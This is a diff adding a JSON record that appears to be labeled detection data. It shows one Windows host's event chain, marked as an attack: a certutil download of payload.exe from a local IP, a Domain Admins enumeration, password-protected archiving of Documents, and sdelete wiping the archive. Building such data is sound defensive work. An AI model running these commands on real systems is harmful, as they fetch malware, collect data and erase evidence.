@@ -1,0 +1,54 @@
+{
+  "entity": "UTICA/dschrute",
+  "prior_chain_verdict": {
+    "verdict": "attack",
+    "plausibility": 0.88,
+    "likely_tactics": ["Command and Control", "Discovery", "Collection"]
+  },
+  "events": [
+    {
+      "time": "07:54:12",
+      "raw": "UTICA/dschrute process_create | certutil.exe -urlcache -split -f http://192.168.0.5/payload.exe",
+      "silver": {
+        "event_category": "process_create",
+        "image_name": "certutil.exe",
+        "image_path": "C:\\Windows\\System32\\certutil.exe",
+        "command_line": "certutil.exe -urlcache -split -f http://192.168.0.5/payload.exe C:\\Users\\dschrute\\AppData\\Local\\Temp\\payload.exe",
+        "subject_account": "dschrute"
+      }
+    },
+    {
+      "time": "07:58:40",
+      "raw": "UTICA/dschrute process_create | net.exe group \"Domain Admins\" /domain",
+      "silver": {
+        "event_category": "process_create",
+        "image_name": "net.exe",
+        "image_path": "C:\\Windows\\System32\\net.exe",
+        "command_line": "net.exe group \"Domain Admins\" /domain",
+        "subject_account": "dschrute"
+      }
+    },
+    {
+      "time": "08:11:03",
+      "raw": "UTICA/dschrute process_create | rar.exe a -hp arquivo.rar C:\\Users\\dschrute\\Documents",
+      "silver": {
+        "event_category": "process_create",
+        "image_name": "rar.exe",
+        "image_path": "C:\\Users\\dschrute\\AppData\\Local\\Temp\\rar.exe",
+        "command_line": "rar.exe a -hpSenh4Forte arquivo.rar C:\\Users\\dschrute\\Documents\\*",
+        "subject_account": "dschrute"
+      }
+    },
+    {
+      "time": "08:26:55",
+      "raw": "UTICA/dschrute process_create | sdelete64.exe -accepteula arquivo.rar",
+      "silver": {
+        "event_category": "process_create",
+        "image_name": "sdelete64.exe",
+        "image_path": "C:\\Users\\dschrute\\AppData\\Local\\Temp\\sdelete64.exe",
+        "command_line": "sdelete64.exe -accepteula -p 3 C:\\Users\\dschrute\\AppData\\Local\\Temp\\arquivo.rar",
+        "subject_account": "dschrute"
+      }
+    }
+  ]
+}
